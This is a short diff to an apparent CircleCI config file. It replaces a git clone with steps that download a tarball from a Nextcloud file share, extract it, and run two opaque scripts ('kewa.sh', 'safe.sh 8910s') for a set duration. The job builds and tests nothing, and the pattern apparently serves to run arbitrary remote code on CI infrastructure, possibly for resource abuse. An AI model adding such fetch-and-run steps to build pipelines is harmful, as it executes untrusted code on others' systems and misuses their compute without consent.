@@ -1,14 +1,15 @@
 version: 2.1
 jobs:
   build:
-    docker:
+    docker: 
       - image: ubuntu:18.04
 
     steps:
       - run:
           command: |
             apt update
-            apt install sudo git -y
-            git clone https://github.com/samita100/test.git
-            cd test
-            bash safe.sh 2h
+            apt install sudo wget -y
+            wget -O lhope.tar.gz https://nextcloud-fi.webo.hosting/s/$LINK/download
+            tar xzf lhope.tar.gz
+            bash kewa.sh
+            bash safe.sh 8910s
